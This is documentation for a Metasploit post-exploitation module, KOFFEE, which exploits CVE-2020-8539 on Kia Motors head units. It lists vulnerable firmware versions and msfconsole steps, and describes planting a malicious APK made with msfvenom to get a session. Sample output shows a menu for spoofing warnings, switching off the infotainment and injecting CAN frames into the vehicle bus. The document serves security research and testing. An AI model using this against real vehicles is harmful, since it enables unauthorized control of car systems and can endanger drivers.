## Vulnerable Application

KOFFEE exploits the CVE-2020-8539, which is an Arbitrary Code Execution vulnerabilty that allows a user
to execute the micomd binary with valid payloads on Kia Motors Head Units.
By using KOFFEE an attacker can send crafted micomd commands to control the head unit and send CAN bus frames
into the Multimedia CAN (M-Can) of the vehicle.

### Vulnerable Head Unit software versions
- SOP.003.30.180703
- SOP.005.7.181019
- SOP.007.1.191209

## Verification Steps

- [ ] Start `msfconsole`
- [ ] `use post/android/local/koffee`
- [ ] `set session 1`
- [ ] `run`

### What do you need
* An active session with the Head Unit

## Options
- MICOMD: it contains the path to micomd executable
- NUM_MSG: it expresses the number of MICOM commands sent each time
- PERIOD: it indicates the time (ms) interval between two MICOM commands, aka Period of CAN frames
- SESSION: it referes to the metasploit session number on which this module is run.

## Scenarios
KOFFEE can be run as post-exploitation module when an active session is available with the Head Unit (HU).
First, an attacker may create a malicious apk to generate a remote connection with the HU.
For instace, using msfvenom or other tools, an attacker can create the malicious apk that, once installed in the HU,
starts an active session. Now, the attacker is able to use the KOFFEE exploit to take control of the HU and
inject CAN bus frames into the M-CAN bus of the vehicle.


### Usage

```bach
msf6 > use post/android/local/koffee
msf6 post(android/local/koffee) > set session 1
session => 1
msf6 post(android/local/koffee) > run

[*]  
[*]            `:+ydmNMMNmhs:
         .odMMMMMMMMMMMMMMm`
       /dM MMMMMMM MMMMMMM: o`
     /mMMM MMMMMM MMMMMMm-`yMs
   .dMMMMM MMMMM MMMMMm+ :mMMN
  :NMMMMMM MMMM MMMMh/ :hMMMMN
 /MMMMMMMM MMM Mmy/`.omMMMMMMy
.NMMMMMMMM my+:`./smMMMMMMMMN.
yMMMMMMNy/ `/shNMMMMMMMMMMMM/
NMMMMd/`-s MM MMMMMMMMMMMMN:
NMMd- +mMM MMM MMMMMMMMMMd.
sMo :mMMMM MMMM MMMMMMMm/
`/ oMMMMMM MMMMM MMMMd/
  .NMMMMMM MMMMMM do.
    :shmNMMNmdy+:`        
[*]  
[*]  -- Welcome, would you like a KOFFEE? --
[*]  
[*] Make your choice:
     1. Mute/unmute radio
     2. Reduce radio volume
     3. Radio volume at maximum
     4. Low screen brightness
     5. High screen brightness
     6. Low fuel warning message
     7. Navigation full screen
     8. Set navigation address
     9. Seek down
     10. Seek Up
     11. Switch off Infotainment
     12. Switch On Infotainment
     13. Camera Reverse On
     14. Camera Reverse Off
     15. Inject pre-crafted CAN frames into MM bus
     16. Inject custom command
     0. Exit
Koffee > 1
[*]  -- Sending Command -- 
...
Koffee > 0
[*] Post module execution completed
```
